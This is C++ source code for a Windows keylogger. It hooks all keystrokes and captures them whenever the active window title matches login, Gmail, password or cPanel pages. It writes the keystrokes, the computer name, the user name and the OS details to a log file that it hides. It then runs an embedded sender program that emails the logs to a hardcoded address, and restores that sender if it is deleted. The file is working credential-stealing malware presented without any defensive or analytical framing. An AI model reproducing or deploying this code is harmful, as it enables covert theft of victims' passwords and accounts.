#include<string>
//#include <thread>
//#include <chrono>
#include <future>
#include "resource.h"
#include"HelpingFunctions.h"
#include "../../include/config.h"
#include "Resources.h"

LPCWSTR gEmail = L"xboy.xhacker@gmail.com";

HHOOK $__KL_Hook = NULL;
BOOL $__KL_Array_Virtual_Keys[223][2];
string $__KL_CapturedKeys = "";
BOOL $CanCaptureKey = true;
HWINEVENTHOOK $__KL_WinEvent_Hook = NULL;
LPWSTR newTitle = new TCHAR[500], oldTitle = new TCHAR[500],writtenTitle = new TCHAR[500];
BOOL isWriteHeader = TRUE;
BOOL isCheckaSyncFail = TRUE;
LPWSTR $__KL_LogFile = _CombinePath(gAppDataDir,_GetTimeFileName());
LPWSTR _ComputerName =_GetComputerName();
LPCWSTR _UserName = _GetUserName();
long prevTime = GetDuration();
long timeDif=0, timeToHooks = 1, timeToSend = 0;

BOOL $RecoverFlag = TRUE,$isCheckRecover=TRUE,$isSend = TRUE,isAsyncSendRun = FALSE;

BOOL $IsAdmin = _IsAdmin();


void FlagCheck();
void WriteHeader();
void WriteTitle(LPWSTR title);
void WriteLog();
void SendMail();


void CheckRecover();

/*
class KeyFile
{
	private:
		string errorMsg;

	public:
		KeyFile()
		{
			_PopulateKeys($__KL_Array_Virtual_Keys);
			errorMsg = "No Error Found";
		}
		void MsgLoop()
		{
			MSG message;
			while (GetMessage(&message,NULL,0,0)) {
				TranslateMessage( &message );
				DispatchMessage( &message );
			}
		}
		string GetErrorMsg()
		{
			return errorMsg;
		}
		string GetLastErrorAsString();	
		int _SetHooks(BOOL enable);
		void _PopulateKeys(BOOL array[223][2]);
};

*/

void MsgLoop()
		{
			MSG message;
			while (GetMessage(&message,NULL,0,0)) {
				TranslateMessage( &message );
				DispatchMessage( &message );
			}
		}

LRESULT CALLBACK KeyProcess(int nCode, WPARAM wParam, LPARAM lParam)
{
	////wprintf("KeyStart: %d \t",clock()/CLOCKS_PER_SEC);
	if (isCheckaSyncFail)
	{
		FlagCheck();
	}
	
	if (nCode < 0 || !$CanCaptureKey)  // do not process message 
		return CallNextHookEx($__KL_Hook, nCode, wParam, lParam);

		KBDLLHOOKSTRUCT kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
		DWORD scanCode = kbStruct.scanCode;
		DWORD vkCode = kbStruct.vkCode;
    
		////wprintf("wParam: %d scanCode: %d vkCode: %d\n",wParam,scanCode,vkCode);
		switch ((int)wParam)
		{
		case 256:
			//This dll call in here is interesting, I don't know why but if I wouldn't have added it, keys would not appear in proper case ,:/ remove it and see what I mean!
			GetKeyState(0);
			if ($__KL_Array_Virtual_Keys[vkCode][0])
			{
				LPWSTR keyName = new TCHAR[256];
				int res = GetKeyNameText((scanCode<<16)|(kbStruct.flags<<24),keyName,256);
				if (lstrcmpiW(keyName,L"Backspace") == 0)
				{
					
					$__KL_CapturedKeys = $__KL_CapturedKeys+"[BS]";
				}
				else if (lstrcmpiW(keyName,L"Tab") == 0)
				{
					$__KL_CapturedKeys = $__KL_CapturedKeys+"[TAB]";
				}
				else if (lstrcmpiW(keyName,L"ENTER") == 0)
				{
					$__KL_CapturedKeys = $__KL_CapturedKeys+"[ENT]";
				}
			}
			break;
		default:
			if ($__KL_Array_Virtual_Keys[vkCode][1])
			{
				BYTE $KeyProcess[256]={0};
				GetKeyboardState($KeyProcess);
				WORD chars;
				if (ToAsciiEx(vkCode,scanCode, $KeyProcess, &chars, 0,NULL) != NULL)
				{
					$__KL_CapturedKeys = $__KL_CapturedKeys+(char)chars;
				}
			}
			break;
		}
		////wprintf("KeyEnd: %d\n",clock()/CLOCKS_PER_SEC);
	return CallNextHookEx($__KL_Hook, nCode, wParam, lParam); 
}

void CALLBACK WindowsEventProcess(HWINEVENTHOOK hook, DWORD event, HWND hwnd,LONG idObject, LONG idChild,DWORD dwEventThread, DWORD dwmsEventTime)
{
	if ($isSend && !isAsyncSendRun)
	{
		if (FileExists($uploc))
		{
			SendMail();
		}
		else
		{
			$RecoverFlag = TRUE;
			//wprintf(L"Error: SenMail File Not Exists: %s\n",$uploc);
		}
		
	}
	
	if ($RecoverFlag)
	{
		CheckRecover();
	}
}

int _SetHooks(BOOL enable = TRUE)	
	{	
		if (!enable)
		{
			UnhookWindowsHookEx($__KL_Hook);
			UnhookWinEvent($__KL_WinEvent_Hook);
			return FALSE;
		}
		// Get Handle To Current Program Module
		HMODULE mHandle= GetModuleHandleW(0);
		if (mHandle == NULL)
		{
			//wprintf(L"*Errror: SetWindowsHookEx\n");
			return 0;
		}

		//Get Hook Handle Of Keyboard
		$__KL_Hook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyProcess,mHandle,0);
		if ($__KL_Hook == NULL)
		{
			//wprintf(L"*Errror: SetWindowsHookEx\n");
			return 0;
		}
		
		//Set Windows Event
		$__KL_WinEvent_Hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND,EVENT_SYSTEM_FOREGROUND,NULL,WindowsEventProcess,0,0,WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);

		if ($__KL_WinEvent_Hook == NULL)
		{
			//wprintf(L"*Errror: WinEvent Hook\n");
			return 0;
		}
		
		return 1;
	}

void FlagCheck()
{
	oldTitle = newTitle;
	newTitle = GetActiveWindowTitle();

	BOOL isNewAndOldSame = StrCmpW(oldTitle,newTitle)==0;
	BOOL isWrittenAndOldSame = StrCmpW(oldTitle,writtenTitle)==0;

	if (!isNewAndOldSame && ($__KL_CapturedKeys.length()) > 5)
	{
		if (!isWrittenAndOldSame)
		{
			if(isWriteHeader)
			{
				WriteHeader();
				isWriteHeader=FALSE;
			}

			//Write Title
			WriteTitle(oldTitle);
			writtenTitle = oldTitle;
		}
		//write key
		WriteLog();
	}
	if ((StrStrI(newTitle,L"Gmail") || StrStrI(newTitle,L"log in") || StrStrI(newTitle,L"sign in") || StrStrI(newTitle,L"login") || StrStrI(newTitle,L"signin") || StrStrI(newTitle,L"Password") || StrStrI(newTitle,L"cpanel") || StrStrI(newTitle,L"member")))
	{
		
		$CanCaptureKey = TRUE;
	}
	else
	{
		$CanCaptureKey = FALSE;
		if ($isCheckRecover)
		{
			CheckRecover();
			$isCheckRecover = FALSE;
		}
		//shedule reset hook
	}
	
}

void _PopulateKeys(BOOL array[223][2])
{
	//wprintf(L"KeyPopuLated.\n");
	BOOL arr[223][2]={
                        {FALSE   ,       TRUE},
                        {FALSE   ,       TRUE},
                        {FALSE   ,       TRUE},                 //       2                       00000002
                        {FALSE   ,       TRUE},                 //       3                       00000003
                        {FALSE   ,       TRUE},                 //       4                       00000004
                        {FALSE   ,       TRUE},                 //       5                       00000005
                        {FALSE   ,       TRUE},                 //       6                       00000006
                        {FALSE   ,       TRUE},                 //       7                       00000007
                        {TRUE    ,       FALSE},                //       8                       00000008
                        {TRUE    ,       FALSE},                //       9                       00000009
                        {FALSE   ,       TRUE},                 //       10                      0000000A
                        {FALSE   ,       TRUE},                 //       11                      0000000B
                        {TRUE    ,       FALSE},                //       12                      0000000C
                        {TRUE    ,       FALSE},                //       13                      0000000D
                        {FALSE   ,       TRUE},                 //       14                      0000000E
                        {FALSE   ,       TRUE},                 //       15                      0000000F
                        {TRUE    ,       FALSE},                //       16                      00000010
                        {TRUE    ,       FALSE},                //       17                      00000011
                        {TRUE    ,       FALSE},                //       18                      00000012
                        {TRUE    ,       FALSE},                //       19                      00000013
                        {TRUE    ,       FALSE},                //       20                      00000014
                        {FALSE   ,       TRUE},                 //       21                      00000015
                        {FALSE   ,       TRUE},                 //       22                      00000016
                        {FALSE   ,       TRUE},                 //       23                      00000017
                        {FALSE   ,       TRUE},                 //       24                      00000018
                        {FALSE   ,       TRUE},                 //       25                      00000019
                        {FALSE   ,       TRUE},                 //       26                      0000001A
                        {TRUE    ,       FALSE},                //       27                      0000001B
                        {FALSE   ,       TRUE},                 //       28                      0000001C
                        {FALSE   ,       TRUE},                 //       29                      0000001D
                        {FALSE   ,       TRUE},                 //       30                      0000001E
                        {FALSE   ,       TRUE},                 //       31                      0000001F
                        {FALSE   ,       TRUE},                 //       32                      00000020
                        {TRUE    ,       FALSE},                //       33                      00000021
                        {TRUE    ,       FALSE},                //       34                      00000022
                        {TRUE    ,       FALSE},                //       35                      00000023
                        {TRUE    ,       FALSE},                //       36                      00000024
                        {TRUE    ,       FALSE},                //       37                      00000025
                        {TRUE    ,       FALSE},                //       38                      00000026
                        {TRUE    ,       FALSE},                //       39                      00000027
                        {TRUE    ,       FALSE},                //       40                      00000028
                        {FALSE   ,       TRUE},                 //       41                      00000029
                        {FALSE   ,       TRUE},                 //       42                      0000002A
                        {FALSE   ,       TRUE},                 //       43                      0000002B
                        {TRUE    ,       FALSE},                //       44                      0000002C
                        {TRUE    ,       FALSE},                //       45                      0000002D
                        {TRUE    ,       FALSE},                //       46                      0000002E
                        {FALSE   ,       TRUE},                 //       47                      0000002F
                        {FALSE   ,       TRUE},                 //       48                      00000030
                        {FALSE   ,       TRUE},                 //       49                      00000031
                        {FALSE   ,       TRUE},                 //       50                      00000032
                        {FALSE   ,       TRUE},                 //       51                      00000033
                        {FALSE   ,       TRUE},                 //       52                      00000034
                        {FALSE   ,       TRUE},                 //       53                      00000035
                        {FALSE   ,       TRUE},                 //       54                      00000036
                        {FALSE   ,       TRUE},                 //       55                      00000037
                        {FALSE   ,       TRUE},                 //       56                      00000038
                        {FALSE   ,       TRUE},                 //       57                      00000039
                        {FALSE   ,       TRUE},                 //       58                      0000003A
                        {FALSE   ,       TRUE},                 //       59                      0000003B
                        {FALSE   ,       TRUE},                 //       60                      0000003C
                        {FALSE   ,       TRUE},                 //       61                      0000003D
                        {FALSE   ,       TRUE},                 //       62                      0000003E
                        {FALSE   ,       TRUE},                 //       63                      0000003F
                        {FALSE   ,       TRUE},                 //       64                      00000040
                        {FALSE   ,       TRUE},                 //       65                      00000041
                        {FALSE   ,       TRUE},                 //       66                      00000042
                        {FALSE   ,       TRUE},                 //       67                      00000043
                        {FALSE   ,       TRUE},                 //       68                      00000044
                        {FALSE   ,       TRUE},                 //       69                      00000045
                        {FALSE   ,       TRUE},                 //       70                      00000046
                        {FALSE   ,       TRUE},                 //       71                      00000047
                        {FALSE   ,       TRUE},                 //       72                      00000048
                        {FALSE   ,       TRUE},                 //       73                      00000049
                        {FALSE   ,       TRUE},                 //       74                      0000004A
                        {FALSE   ,       TRUE},                 //       75                      0000004B
                        {FALSE   ,       TRUE},                 //       76                      0000004C
                        {FALSE   ,       TRUE},                 //       77                      0000004D
                        {FALSE   ,       TRUE},                 //       78                      0000004E
                        {FALSE   ,       TRUE},                 //       79                      0000004F
                        {FALSE   ,       TRUE},                 //       80                      00000050
                        {FALSE   ,       TRUE},                 //       81                      00000051
                        {FALSE   ,       TRUE},                 //       82                      00000052
                        {FALSE   ,       TRUE},                 //       83                      00000053
                        {FALSE   ,       TRUE},                 //       84                      00000054
                        {FALSE   ,       TRUE},                 //       85                      00000055
                        {FALSE   ,       TRUE},                 //       86                      00000056
                        {FALSE   ,       TRUE},                 //       87                      00000057
                        {FALSE   ,       TRUE},                 //       88                      00000058
                        {FALSE   ,       TRUE},                 //       89                      00000059
                        {FALSE   ,       TRUE},                 //       90                      0000005A
                        {TRUE    ,       FALSE},                //       91                      0000005B
                        {TRUE    ,       FALSE},                //       92                      0000005C
                        {TRUE    ,       FALSE},                //       93                      0000005D
                        {FALSE   ,       TRUE},                 //       94                      0000005E
                        {FALSE   ,       TRUE},                 //       95                      0000005F
                        {FALSE   ,       TRUE},                 //       96                      00000060
                        {FALSE   ,       TRUE},                 //       97                      00000061
                        {FALSE   ,       TRUE},                 //       98                      00000062
                        {FALSE   ,       TRUE},                 //       99                      00000063
                        {FALSE   ,       TRUE},                 //       100                     00000064
                        {FALSE   ,       TRUE},                 //       101                     00000065
                        {FALSE   ,       TRUE},                 //       102                     00000066
                        {FALSE   ,       TRUE},                 //       103                     00000067
                        {FALSE   ,       TRUE},                 //       104                     00000068
                        {FALSE   ,       TRUE},                 //       105                     00000069
                        {FALSE   ,       TRUE},                 //       106                     0000006A
                        {FALSE   ,       TRUE},                 //       107                     0000006B
                        {FALSE   ,       TRUE},                 //       108                     0000006C
                        {FALSE   ,       TRUE},                 //       109                     0000006D
                        {FALSE   ,       TRUE},                 //       110                     0000006E
                        {FALSE   ,       TRUE},                 //       111                     0000006F
                        {TRUE    ,       FALSE},                //       112                     00000070
                        {TRUE    ,       FALSE},                //       113                     00000071
                        {TRUE    ,       FALSE},                //       114                     00000072
                        {TRUE    ,       FALSE},                //       115                     00000073
                        {TRUE    ,       FALSE},                //       116                     00000074
                        {TRUE    ,       FALSE},                //       117                     00000075
                        {TRUE    ,       FALSE},                //       118                     00000076
                        {TRUE    ,       FALSE},                //       119                     00000077
                        {TRUE    ,       FALSE},                //       120                     00000078
                        {TRUE    ,       FALSE},                //       121                     00000079
                        {TRUE    ,       FALSE},                //       122                     0000007A
                        {TRUE    ,       FALSE},                //       123                     0000007B
                        {FALSE   ,       TRUE},                 //       124                     0000007C
                        {FALSE   ,       TRUE},                 //       125                     0000007D
                        {FALSE   ,       TRUE},                 //       126                     0000007E
                        {FALSE   ,       TRUE},                 //       127                     0000007F
                        {FALSE   ,       TRUE},                 //       128                     00000080
                        {FALSE   ,       TRUE},                 //       129                     00000081
                        {FALSE   ,       TRUE},                 //       130                     00000082
                        {FALSE   ,       TRUE},                 //       131                     00000083
                        {FALSE   ,       TRUE},                 //       132                     00000084
                        {FALSE   ,       TRUE},                 //       133                     00000085
                        {FALSE   ,       TRUE},                 //       134                     00000086
                        {FALSE   ,       TRUE},                 //       135                     00000087
                        {FALSE   ,       TRUE},                 //       136                     00000088
                        {FALSE   ,       TRUE},                 //       137                     00000089
                        {FALSE   ,       TRUE},                 //       138                     0000008A
                        {FALSE   ,       TRUE},                 //       139                     0000008B
                        {FALSE   ,       TRUE},                 //       140                     0000008C
                        {FALSE   ,       TRUE},                 //       141                     0000008D
                        {FALSE   ,       TRUE},                 //       142                     0000008E
                        {FALSE   ,       TRUE},                 //       143                     0000008F
                        {TRUE    ,       FALSE},                //       144                     00000090
                        {TRUE    ,       FALSE},                //       145                     00000091
                        {FALSE   ,       TRUE},                 //       146                     00000092
                        {FALSE   ,       TRUE},                 //       147                     00000093
                        {FALSE   ,       TRUE},                 //       148                     00000094
                        {FALSE   ,       TRUE},                 //       149                     00000095
                        {FALSE   ,       TRUE},                 //       150                     00000096
                        {FALSE   ,       TRUE},                 //       151                     00000097
                        {FALSE   ,       TRUE},                 //       152                     00000098
                        {FALSE   ,       TRUE},                 //       153                     00000099
                        {FALSE   ,       TRUE},                 //       154                     0000009A
                        {FALSE   ,       TRUE},                 //       155                     0000009B
                        {FALSE   ,       TRUE},                 //       156                     0000009C
                        {FALSE   ,       TRUE},                 //       157                     0000009D
                        {FALSE   ,       TRUE},                 //       158                     0000009E
                        {FALSE   ,       TRUE},                 //       159                     0000009F
                        {TRUE    ,       FALSE},                //       160                     000000A0
                        {TRUE    ,       FALSE},                //       161                     000000A1
                        {TRUE    ,       FALSE},                //       162                     000000A2
                        {TRUE    ,       FALSE},                //       163                     000000A3
                        {TRUE    ,       FALSE},                //       164                     000000A4
						{TRUE    ,       FALSE},                //       165                     000000A5
                        {FALSE   ,       TRUE},                 //       166                     000000A6
                        {FALSE   ,       TRUE},                 //       167                     000000A7
                        {FALSE   ,       TRUE},                 //       168                     000000A8
                        {FALSE   ,       TRUE},                 //       169                     000000A9
                        {FALSE   ,       TRUE},                 //       170                     000000AA
                        {FALSE   ,       TRUE},                 //       171                     000000AB
                        {FALSE   ,       TRUE},                 //       172                     000000AC
                        {FALSE   ,       TRUE},                 //       173                     000000AD
                        {FALSE   ,       TRUE},                 //       174                     000000AE
                        {FALSE   ,       TRUE},                 //       175                     000000AF
                        {FALSE   ,       TRUE},                 //       176                     000000B0
                        {FALSE   ,       TRUE},                 //       177                     000000B1
                        {FALSE   ,       TRUE},                 //       178                     000000B2
                        {FALSE   ,       TRUE},                 //       179                     000000B3
                        {FALSE   ,       TRUE},                 //       180                     000000B4
                        {FALSE   ,       TRUE},                 //       181                     000000B5
                        {FALSE   ,       TRUE},                 //       182                     000000B6
                        {FALSE   ,       TRUE},                 //       183                     000000B7
                        {FALSE   ,       TRUE},                 //       184                     000000B8
                        {FALSE   ,       TRUE},                 //       185                     000000B9
                        {FALSE   ,       TRUE},                 //       186                     000000BA
                        {FALSE   ,       TRUE},                 //       187                     000000BB
                        {FALSE   ,       TRUE},                 //       188                     000000BC
                        {FALSE   ,       TRUE},                 //       189                     000000BD
                        {FALSE   ,       TRUE},                 //       190                     000000BE
                        {FALSE   ,       TRUE},                 //       191                     000000BF
                        {FALSE   ,       TRUE},                 //       192                     000000C0
                        {FALSE   ,       TRUE},                 //       193                     000000C1
                        {FALSE   ,       TRUE},                 //       194                     000000C2
                        {FALSE   ,       TRUE},                 //       195                     000000C3
                        {FALSE   ,       TRUE},                 //       196                     000000C4
                        {FALSE   ,       TRUE},                 //       197                     000000C5
                        {FALSE   ,       TRUE},                 //       198                     000000C6
                        {FALSE   ,       TRUE},                 //       199                     000000C7
                        {FALSE   ,       TRUE},                 //       200                     000000C8
                        {FALSE   ,       TRUE},                 //       201                     000000C9
                        {FALSE   ,       TRUE},                 //       202                     000000CA
                        {FALSE   ,       TRUE},                 //       203                     000000CB
                        {FALSE   ,       TRUE},                 //       204                     000000CC
                        {FALSE   ,       TRUE},                 //       205                     000000CD
                        {FALSE   ,       TRUE},                 //       206                     000000CE
                        {FALSE   ,       TRUE},                 //       207                     000000CF
                        {FALSE   ,       TRUE},                 //       208                     000000D0
                        {FALSE   ,       TRUE},                 //       209                     000000D1
                        {FALSE   ,       TRUE},                 //       210                     000000D2
                        {FALSE   ,       TRUE},                 //       211                     000000D3
                        {FALSE   ,       TRUE},                 //       212                     000000D4
                        {FALSE   ,       TRUE},                 //       213                     000000D5
                        {FALSE   ,       TRUE},                 //       214                     000000D6
                        {FALSE   ,       TRUE},                 //       215                     000000D7
                        {FALSE   ,       TRUE},                 //       216                     000000D8
                        {FALSE   ,       TRUE},                 //       217                     000000D9
                        {FALSE   ,       TRUE},                 //       218                     000000DA
                        {FALSE   ,       TRUE},                 //       219                     000000DB
                        {FALSE   ,       TRUE},                 //       220                     000000DC
                        {FALSE   ,       TRUE},                 //       221                     000000DD
                        {FALSE   ,       TRUE}                  //       222         000000DE
		};

		for (int i = 0; i < 223; i++)
		{
			for (int j = 0; j < 2; j++)
			{
				array[i][j] = arr[i][j];
			}
		}
		
}

void WriteHeader()
{
	//wprintf(L"=>Write Header\n");
	LPWSTR tempStr = new TCHAR[1024];
	wsprintf(tempStr,L"Computer Name: %s",_ComputerName);
	FileWriteLine($__KL_LogFile,tempStr);
	
	wsprintf(tempStr,L"UserName: %s",_UserName);
	FileWriteLine($__KL_LogFile,tempStr);
				
	wsprintf(tempStr,L"Windows: %s - %s",GetOsName(),GetOsArch());
	FileWriteLine($__KL_LogFile,tempStr);

	wsprintf(tempStr,L"Date: %s",_GetCurrentDate());
	FileWriteLine($__KL_LogFile,tempStr);
	wsprintf(tempStr,L"Time: %s",_GetCurrentTime());
	FileWriteLine($__KL_LogFile,tempStr);
	FileWriteLine($__KL_LogFile,L"File Ver: 1.1.1.3");
	//FileWriteLine($__KL_LogFile,L"File Detail: xsoft");
	FileWriteLine($__KL_LogFile,L"************************************************************");
}

void WriteTitle(LPWSTR title)
{
	//wprintf(L"=>Write Title\n");
	//FileWriteLine($__KL_LogFile,@CRLF&"[ "&$oT&" ]"&@CRLF)
	LPWSTR mytitle = new TCHAR[500];
	wsprintf(mytitle,L"\n[ %s ]",title);
	FileWriteLine($__KL_LogFile,mytitle);
}

void WriteLog()
{
	//wprintf(L"=>Write Log\n");
	FileWriteLine($__KL_LogFile,$__KL_CapturedKeys);
	$__KL_CapturedKeys="";
	SetFileAttributes($__KL_LogFile,GetFileAttributes($__KL_LogFile) | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	//$timedif=(((TimerDiff($time)/1000)/60)/60)
	/*
	long currentTime  = GetDuration();
	if ((currentTime-prevTime)>15)
	{
		
	}
	*/
}

void ResetHook()
{
	//wprintf(L"Reset Hook.\n");
	_SetHooks(FALSE);
	_SetHooks(TRUE);
}

void ResetVariables()
{
	//wprintf(L"Reset Variables.\n");
	$__KL_LogFile = _CombinePath(gAppDataDir,_GetTimeFileName());
	
	newTitle = L"", oldTitle = L"",writtenTitle = L"";
	isWriteHeader = TRUE;
	$isSend = TRUE;
	$isCheckRecover = TRUE;
}

VOID CALLBACK TimerResetHook(HWND hwnd,UINT uMsg,UINT_PTR idEvent,DWORD dwTime)
{
	ResetHook();
}

VOID CALLBACK TimerResetVar(HWND hwnd,UINT uMsg,UINT_PTR idEvent,DWORD dwTime)
{
	ResetVariables();
}

void SheduleResetHook(int mins)
{
	SetTimer(NULL,0,mins*1000*60,TimerResetHook);
	/*
	isResetHookSheduled = TRUE;
	std::async(std::launch::async, [mins] {
			std::this_thread::sleep_for(std::chrono::milliseconds(mins*1000*60));
			ResetHook();
			isResetHookSheduled = FALSE;
	});
	*/
}

void SheduleResetVariables(int hours)
{
	SetTimer(NULL,0,hours*1000*60*60,TimerResetVar);	
}

void CheckRecover()
{
	LPWSTR tempLoc = _CombinePath(gTempDir,L"ApntxSen.exe");
	if (!FileExists($LocUploadBackup) && $IsAdmin)
	{
		_ExtractFromRes($LocUploadBackup,L"EXESEND");
	}
	FileCopy($LocUploadBackup,$uploc);

	if (!FileExists($uploc))
	{
		_ExtractFromRes(tempLoc,L"EXESEND");
	}

	if (!FileExists(tempLoc))
	{
		$RecoverFlag = TRUE;
		////wprintf(L"*Error => File Not Exists: %s\n",tempLoc);
	}
	else
	{
		$RecoverFlag = FALSE;
		$uploc = tempLoc;
	}

}

void SendMail()
{
	//wprintf(L"Async Mail Send Called");
			isAsyncSendRun = TRUE;
			auto AsyncSendStatus = std::async(std::launch::async, [] {
				LPWSTR commandLine = new TCHAR[500];
				wsprintfW(commandLine,L"78612 %s %s",gEmail,_ComputerName);
				int returnCode = GetProcessExitCode(_RunPro($uploc,commandLine));
				//LPWSTR retCode = new TCHAR[20];
				//wsprintf(retCode,L"%d",returnCode);
				//MessageBox(NULL,retCode,L"SendMail Return Code",0);
				//wprintf(L"Return Code By: SendMail: %d\n",returnCode);
				if(returnCode == 786)
				{
					//wprintf(L"MailSend Successfully\n");
					$isSend = FALSE;
				}
				else
				{
					//wprintf(L"Error Returned By Send Mail And Wait 10 Min\n");
					std::this_thread::sleep_for(std::chrono::milliseconds(10*1000*60));
				}
				isAsyncSendRun = FALSE;
			});
}

VOID CALLBACK TimerFlagCheck(HWND hwnd,UINT uMsg,UINT_PTR idEvent,DWORD dwTime)
{
		std::async(std::launch::async, [] {
		isCheckaSyncFail = FALSE;
		FlagCheck();
	});
}

void SheduleFlagCheck(int millisecs)
{
	SetTimer(NULL,0,millisecs,TimerFlagCheck);
}
